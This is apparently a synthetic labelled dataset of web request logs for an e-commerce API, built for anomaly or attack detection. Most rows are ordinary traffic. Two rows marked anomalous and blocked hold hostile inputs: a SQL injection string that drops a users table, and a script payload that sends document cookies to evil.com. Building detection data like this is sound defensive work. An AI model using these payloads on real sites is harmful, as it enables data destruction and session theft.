record_id,timestamp,client_ip,field_a,field_b,field_c,field_d,field_e,field_f,is_anomaly
5ea3b2f0-0c27-4866-ba8f-817a999927c8,2026-05-01 11:02:24,10[.]50[.]46[.]172,GET,/api/v1/wishlist,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",142.73,,0
9a965055-b485-4918-8d20-44583f054e31,2026-05-14 16:42:43,172[.]19[.]38[.]202,GET,/api/v1/dashboard/widgets,ALLOW,axios/1.6.7,253.16,,0
5bc196ee-4e71-445c-8a0f-6ff4e5641a86,2026-05-10 18:53:11,192[.]168[.]7[.]96,POST,/static/css/main.css,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",34.94,,0
32815bec-9e2a-4c0f-ab65-4b06df65f5e6,2026-05-01 11:40:27,172[.]31[.]25[.]234,GET,/api/v1/search,ALLOW,"Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",78.0,,0
c2b8445c-7950-46e5-8a55-d54f34d0f540,2026-05-13 16:15:43,192[.]168[.]19[.]246,GET,/api/v1/cart?limit[=]50,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",51.6,,0
e04d8a68-b24b-40c9-9902-d8a258dd69eb,2026-05-04 20:20:54,10[.]19[.]228[.]73,GET,/static/js/app.js,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",127.19,,0
dced127c-2d6c-4b1c-8331-18c045e10724,2026-05-14 09:51:20,172[.]28[.]200[.]176,GET,/help,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",89.9,,0
a2ea6e1f-2b0f-441f-b242-00401b3159db,2026-05-05 13:18:36,192[.]168[.]8[.]186,GET,/favicon.ico,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",21.5,,0
c916b1be-0db8-4005-8d30-e2436c40a855,2026-05-08 07:07:03,192[.]168[.]18[.]191,GET,/api/v1/auth/logout?page[=]20,ALLOW,PostmanRuntime/7.36.0,80.62,,0
1335e668-19f9-4840-9961-7a4a2f6886fd,2026-05-13 16:31:27,192[.]168[.]1[.]109,GET,/api/v1/checkout,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,323.16,,0
efd320dc-90df-489c-b1f9-16270d1530be,2026-05-07 13:18:08,192[.]168[.]10[.]106,POST,/robots.txt,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,136.9,,0
18d01ce9-b58e-498b-b114-6013e25865ce,2026-05-14 10:14:22,192[.]168[.]0[.]3,GET,/api/v1/reviews,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",51.05,,0
27008633-237f-4103-9437-f973202465be,2026-05-02 23:30:18,192[.]168[.]19[.]99,GET,/help,ALLOW,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0,150.23,,0
49a4ff2e-a43f-47b6-8818-e3b78ef5dae3,2026-05-14 21:46:05,192[.]168[.]17[.]244,GET,/api/v1/cart,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",363.7,,0
a3b197a7-46fa-4f1a-9be2-e3b41e83cc5a,2026-05-09 15:59:16,10[.]8[.]140[.]80,GET,/api/v1/checkout?filter[=]active,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",78.5,,0
29ef7a93-7deb-42ef-8d2b-1f7842747f74,2026-05-10 12:49:20,172[.]27[.]22[.]73,GET,/api/v1/categories?page[=]3,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",170.63,,0
5fbccb64-e73a-461f-91cc-19c95828f24d,2026-05-06 17:31:42,10[.]4[.]47[.]242,GET,/api/v1/products/5346,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",91.33,,0
28e261a3-fb43-469f-81eb-7ea25cf0ac20,2026-05-09 19:47:51,192[.]168[.]15[.]91,GET,/robots.txt,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",51.07,,0
ec7e0404-e510-4abd-9e54-144e42e46460,2026-05-10 18:23:13,10[.]11[.]78[.]72,GET,/api/v1/orders,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",58.2,,0
27b6b5db-e00d-4aa7-9115-bc15208c0a96,2026-05-10 13:10:49,192[.]168[.]8[.]165,GET,/api/v1/dashboard/widgets,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",77.73,,0
8f75b922-58c2-4e2f-b392-2d507ddfd2de,2026-05-05 13:46:30,181[.]157[.]28[.]6,GET,/api/v1/cart,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",119.11,,0
3b4e6752-3cea-41b9-8cf3-083fe408c299,2026-05-04 20:34:20,192[.]168[.]7[.]187,GET,/api/v1/categories?category[=]beauty,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",169.95,,0
9858bbaa-e157-4570-b87f-c04a0d9c2379,2026-05-14 10:06:28,172[.]30[.]141[.]168,GET,/api/v1/users/profile?sort[=]created_desc,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",96.81,,0
c2a4eef3-55ed-4dec-b710-36330dd9131f,2026-05-09 16:03:49,192[.]168[.]7[.]199,POST,/api/v1/products,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,141.35,,0
2de4f53b-741a-42f5-b45e-0f5d0d9f5f49,2026-05-06 18:07:19,192[.]168[.]6[.]73,GET,/blog,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",225.87,,0
78054583-9c9b-4f9b-894e-36b04f9f670a,2026-05-04 16:35:09,10[.]33[.]3[.]197,DELETE,/api/v1/payments/methods?sort[=]price_asc,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",53.64,,0
f399a5bc-7a5c-49ec-9368-6994ea115cc3,2026-05-06 11:02:28,192[.]168[.]5[.]60,GET,/docs,ALLOW,axios/1.6.7,52.89,,0
af3ea090-0ce6-4019-902a-a86c63d1cba7,2026-05-05 14:14:53,10[.]16[.]220[.]42,GET,/api/v1/orders,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",101.19,,0
5c68b86c-662d-43ab-a01b-bfffe4e48147,2026-05-01 20:16:40,192[.]168[.]4[.]41,GET,/static/css/print.css,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",118.68,,0
eb26424d-b297-4dc2-a563-b0f73b4d0890,2026-05-10 09:01:23,192[.]168[.]1[.]167,GET,/api/v1/categories,ALLOW,"Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",74.78,,0
69546c46-c4ad-4641-84fc-0061d6d8ead1,2026-05-01 16:20:57,10[.]4[.]62[.]215,PUT,/help,ALLOW,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),55.53,,0
a1f65d5d-7bc2-4644-893b-0694e06159ab,2026-05-01 16:54:25,181[.]157[.]28[.]6,GET,/contact,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",19.77,,0
b8619269-6f89-47e0-b976-5beafef3ad49,2026-05-02 08:45:05,192[.]168[.]6[.]151,GET,/static/img/banner.jpg,ALLOW,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0,157.78,,0
99c09743-2518-49cf-844e-7e636062aca0,2026-05-14 13:20:36,192[.]168[.]15[.]16,GET,/static/css/print.css,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",244.97,,0
6077a4a1-691f-447f-96d4-9a6c5fabc268,2026-05-07 19:04:58,192[.]168[.]10[.]55,GET,/api/v1/recommendations?page[=]6,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",205.4,,0
ac0f591f-87d2-40d5-ac42-5cc1b07e48ea,2026-05-12 13:54:58,192[.]168[.]20[.]81,GET,/api/v1/cart/items?page[=]2&sort[=]name&limit[=]10,ALLOW,"Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",82.41,,0
0c95125f-673b-4573-8e9e-b66881f1e9fb,2026-05-07 18:27:13,10[.]21[.]190[.]58,POST,/api/v1/dashboard/widgets,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",143.61,,0
8d28008a-cbdd-4fd1-8f3b-099632553c44,2026-05-12 17:41:45,192[.]168[.]18[.]195,GET,/api/v1/reviews?category[=]sports,ALLOW,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),131.74,,0
89cb399b-b499-49fc-aa5f-1e743fd751a9,2026-05-12 11:49:27,192[.]168[.]2[.]46,GET,/api/v1/reviews?q[=]test[']; DROP TABLE users--,BLOCK,Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check),80.31,,1
609452c7-6356-4c27-af84-19bbbc206a2b,2026-05-08 19:27:39,192[.]168[.]13[.]26,GET,/api/v1/users/profile,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",119.94,,0
41e7db42-d52e-4a1a-ba52-32899c88be70,2026-05-05 11:13:09,192[.]168[.]10[.]12,GET,/static/js/analytics.js,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",103.43,,0
20dbb332-53b3-4bb6-9c00-5fdecf7e0156,2026-05-11 13:55:08,192[.]168[.]10[.]23,GET,/api/v1/cart,ALLOW,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),171.45,,0
55c90222-6a44-426d-8759-87096f0f9059,2026-05-03 07:30:32,172[.]28[.]196[.]150,GET,/api/v1/recommendations,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",51.72,,0
41d6999a-d0b2-43a7-8d22-633b2b4de34a,2026-05-03 04:10:21,172[.]28[.]196[.]150,POST,/blog,ALLOW,"Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",147.46,,0
214ec27e-4575-43b7-8dfc-b896f50f784e,2026-05-08 15:51:12,10[.]11[.]156[.]111,GET,/favicon.ico,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",27.96,,0
60127cef-109a-4f01-a592-4d495d90b497,2026-05-05 13:09:56,192[.]168[.]1[.]142,GET,/pricing,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,199.09,,0
da41160a-2192-486e-9edf-930cba9147e1,2026-05-01 11:27:40,192[.]168[.]10[.]106,GET,/api/v1/orders?page[=]5&sort[=]name&limit[=]10,ALLOW,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),170.54,,0
54cd185a-3b1f-47d0-ab3d-49a9ccb8c3a6,2026-05-14 08:44:05,101[.]30[.]177[.]112,POST,/api/v1/users/profile?sort[=]price_asc,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",160.62,,0
76eb21ba-ee6b-4f51-9640-0cf64ce3d7b9,2026-05-02 16:08:36,172[.]27[.]149[.]210,GET,/api/v1/reviews?url[=]javascript:document.location[=][']http://evil.com/?c[=][']+document.cookie,BLOCK,Mozilla/4.0 (Hydra),107.25,,1
2379d841-2f45-48b3-b51c-69bd14aa1080,2026-05-07 15:54:58,192[.]168[.]17[.]47,PATCH,/api/v1/users/settings,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",107.16,,0
38cdb75d-f658-4ba5-86ca-97c10ad41856,2026-05-07 14:56:00,172[.]23[.]165[.]143,GET,/blog,ALLOW,PostmanRuntime/7.36.0,210.1,,0
356928fb-29c8-4fcf-a009-75932a08ad47,2026-05-01 11:14:15,10[.]8[.]103[.]158,GET,/api/v1/cart/items,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,66.53,,0
62a2058c-2936-41d6-a2f3-23ab6edbcc8f,2026-05-04 13:33:50,172[.]28[.]196[.]150,POST,/static/js/analytics.js,ALLOW,"Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",74.38,,0
19111c99-7c27-4e4a-9e4e-56eaedaf6409,2026-05-09 09:41:05,57[.]200[.]236[.]55,GET,/help,ALLOW,"Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",119.34,,0
e0820795-1887-40e9-8097-90eaa3f242ba,2026-05-13 17:16:36,192[.]168[.]1[.]34,GET,/static/js/vendor.js,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",159.29,,0
7770cc4e-48ee-4767-8adc-21794817826e,2026-05-07 16:14:24,172[.]21[.]11[.]53,GET,/careers,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",327.63,,0
667514c9-2ca6-4706-b17f-e1da7113977f,2026-05-07 09:04:41,192[.]168[.]20[.]40,POST,/api/v1/auth/logout,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",201.96,,0
a14c48b2-15d6-4f5c-8fe4-60f0422f9407,2026-05-13 19:23:53,192[.]168[.]6[.]194,GET,/favicon.ico,ALLOW,Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot),100.94,,0
34fb2710-1b5e-4705-a63e-8fe9b84f6578,2026-05-06 09:53:02,192[.]168[.]4[.]82,GET,/api/v1/wishlist,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",206.14,,0
e5dc8b37-6e71-4d65-a521-1f7977fa895c,2026-05-11 19:50:56,10[.]27[.]228[.]116,GET,/static/css/print.css,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",95.44,,0
e1cd1d54-a742-4e7f-af92-de150bedbdfd,2026-05-14 15:03:12,192[.]168[.]5[.]215,GET,/manifest.json,ALLOW,"Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",75.59,,0
63e5602c-2005-445f-9635-7adc0ae23da3,2026-05-09 14:13:44,192[.]168[.]10[.]253,POST,/static/img/logo.png,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",201.37,,0
4c5806fd-c28e-4245-a668-f28174218f11,2026-05-05 08:42:47,192[.]168[.]4[.]177,POST,/api/v1/reviews,ALLOW,PostmanRuntime/7.36.0,203.39,,0
9d0d4db5-94f2-400d-a219-51eae7ac4d96,2026-05-05 18:43:01,10[.]49[.]5[.]100,POST,/api/v1/dashboard/stats?category[=]books,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",169.57,,0
0e8cb2b0-ec06-49ca-802f-ce33b3be4357,2026-05-03 16:03:59,10[.]22[.]83[.]206,PUT,/static/css/theme.css,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",129.98,,0
b54a0748-94d7-445d-a5b9-0672d6d6e105,2026-05-14 08:14:37,172[.]27[.]22[.]73,PUT,/static/css/main.css,ALLOW,PostmanRuntime/7.36.0,72.83,,0
cb8f2587-4a6a-408b-8f34-94d68ed30283,2026-05-02 11:32:52,192[.]168[.]13[.]7,GET,/api/v1/auth/refresh,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",163.58,,0
ed969513-5751-47d3-bf7d-af4c65dea470,2026-05-02 16:14:54,10[.]11[.]115[.]27,POST,/api/v1/products/1649,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",68.84,,0
d30f35a8-2042-4ec5-99bc-f66bc813d7ec,2026-05-08 18:24:55,192[.]168[.]19[.]99,GET,/api/v1/search,ALLOW,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0,100.22,,0
85548f3f-d7cd-4e6f-a8fd-0586d0e46e3e,2026-05-02 14:20:11,192[.]168[.]3[.]89,PATCH,/api/v1/users/profile,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",313.05,,0
6e0ef90e-83ed-4907-a61b-a3553e3ca3a9,2026-05-01 15:22:03,10[.]35[.]228[.]80,POST,/api/v1/notifications?limit[=]50,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",100.27,,0
ccb74dd6-6b40-4f5e-b45b-678644ceefdb,2026-05-14 13:46:14,33[.]17[.]178[.]149,GET,/api/v1/auth/logout?sort[=]price_asc,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",66.7,,0
b174f1b5-450d-46b5-b561-1955e5bdb11b,2026-05-03 13:43:52,192[.]168[.]10[.]231,GET,/static/img/hero.webp,ALLOW,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0,175.64,,0
3dead0d3-3dcc-4857-806b-50090fdab614,2026-05-10 21:46:22,172[.]27[.]22[.]73,GET,/api/v1/orders/4688?page[=]19&sort[=]name&limit[=]10,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",225.74,,0
9f40dba5-ae17-4a75-9934-c5f6902103ec,2026-05-10 15:08:38,10[.]31[.]26[.]51,GET,/api/v1/dashboard/stats,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",87.48,,0
b196abdd-84ba-46bc-afda-411fac7019fb,2026-05-06 10:21:45,192[.]168[.]15[.]220,GET,/api/v1/dashboard/widgets,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",143.0,,0
d791101f-1e50-4fdc-bfae-8cddc67e8651,2026-05-08 11:11:35,192[.]168[.]4[.]49,GET,/api/v1/users/settings?filter[=]active,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",158.18,,0
d2b8fd4b-86ca-4d3a-8514-9c0f1940f4ce,2026-05-12 11:47:42,192[.]168[.]3[.]89,POST,/privacy,ALLOW,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),142.82,,0
ccd7a0a8-4491-4f32-ac21-6c83af9e6ea8,2026-05-04 13:37:00,178[.]226[.]171[.]44,GET,/api/v1/cart/items,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",111.2,,0
05ab2753-fb44-4c08-9283-29d53812b892,2026-05-08 18:26:23,192[.]168[.]19[.]246,GET,/api/v1/recommendations?sort[=]price_asc,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",287.05,,0
1bb7aaf5-fe44-41b8-b378-6c7a0003a6bc,2026-05-05 18:01:34,172[.]27[.]22[.]73,GET,/static/js/analytics.js,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",50.7,,0
7ffdaad3-0e2c-40d8-88c6-100f56f6bd5f,2026-05-10 10:27:32,172[.]22[.]62[.]182,POST,/api/v1/users/addresses,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,143.82,,0
36b44c8c-1745-49f2-84b0-dd21c4e9767c,2026-05-07 08:39:19,192[.]168[.]9[.]55,POST,/static/css/main.css,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",142.92,,0
d364834b-f394-4c22-b9c5-e053f7c6676e,2026-05-06 18:06:43,172[.]18[.]7[.]143,GET,/api/v1/search,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",98.26,,0
f39d5d14-4d97-42f9-a190-8981e8243909,2026-05-12 10:21:47,190[.]79[.]213[.]87,GET,/static/js/analytics.js,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,133.35,,0
5aecff74-4f50-473d-adc7-7b35e8727a8c,2026-05-12 16:30:49,192[.]168[.]5[.]195,GET,/api/v1/search?sort[=]price_asc,ALLOW,Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot),102.25,,0
0f1ef76f-61da-4c89-b277-a160fbc08f12,2026-05-04 11:01:12,192[.]168[.]2[.]48,GET,/api/v1/auth/login,ALLOW,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),145.28,,0
00912819-df17-4dc8-826e-be2d27619796,2026-05-07 13:23:28,192[.]168[.]13[.]23,GET,/api/v1/users/addresses?filter[=]active,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",233.0,,0
82ab70f9-fccf-471d-8e28-756ed2241f30,2026-05-04 23:03:46,178[.]193[.]123[.]212,GET,/sitemap.xml,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",143.58,,0
8ab14603-d696-4bf2-9d4b-56f6a0a1284a,2026-05-09 18:19:01,10[.]37[.]184[.]73,GET,/contact,ALLOW,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),38.39,,0
49f6ebd8-0ba8-47a0-a2c4-957b5ac2eefb,2026-05-07 11:30:46,190[.]79[.]213[.]87,POST,/api/v1/dashboard/stats,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,90.4,,0
b64e352d-db3a-44c6-a3e2-8760d283c8b0,2026-05-13 14:39:36,7[.]34[.]217[.]29,GET,/api/v1/products/2151,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",187.52,,0
ffdb876f-3769-44b9-8fca-92b6d9435de5,2026-05-02 13:28:38,192[.]168[.]19[.]246,GET,/help,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",54.76,,0
